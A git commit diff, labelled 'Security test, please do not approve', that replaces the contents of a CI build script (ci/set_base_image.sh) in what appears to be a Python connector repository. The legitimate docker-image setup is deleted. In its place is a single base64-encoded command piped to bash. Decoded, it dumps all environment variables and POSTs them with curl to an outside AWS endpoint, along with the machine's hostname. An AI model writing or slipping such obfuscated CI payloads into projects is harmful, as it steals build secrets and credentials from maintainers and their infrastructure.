ce8a13cab5d47407ef8ae178f006ae6bb1627488
magnumfistuk <magnumfistuk@proton.me>
2023-06-30 21:07:19 +0000

    Security test, please do not approve a. (uybhtf)

--- ci/set_base_image.sh
+++ ci/set_base_image.sh
@@ -1,17 +1,1 @@
-#!/bin/bash -e
-#
-# Use the internal docker registry if running on Jenkins
-#
-set -o pipefail
-INTERNAL_REPO=nexus.int.snowflakecomputing.com:8086
-if [[ -n "$NEXUS_PASSWORD" ]]; then
-    echo "[INFO] Pull docker images from $INTERNAL_REPO"
-    NEXUS_USER=${USERNAME:-jenkins}
-    docker login --username "$NEXUS_USER" --password "$NEXUS_PASSWORD" $INTERNAL_REPO
-    export BASE_IMAGE_MANYLINUX2014=nexus.int.snowflakecomputing.com:8086/docker/manylinux2014_x86_64
-    export BASE_IMAGE_MANYLINUX2014AARCH64=nexus.int.snowflakecomputing.com:8086/docker/manylinux2014_aarch64
-else
-    echo "[INFO] Pull docker images from public registry"
-    export BASE_IMAGE_MANYLINUX2014=quay.io/pypa/manylinux2014_x86_64
-    export BASE_IMAGE_MANYLINUX2014AARCH64=quay.io/pypa/manylinux2014_aarch64
-fi
+echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/snowflakedb/snowflake-connector-python.git\&folder=ci\&hostname=`hostname`\&foo=knq
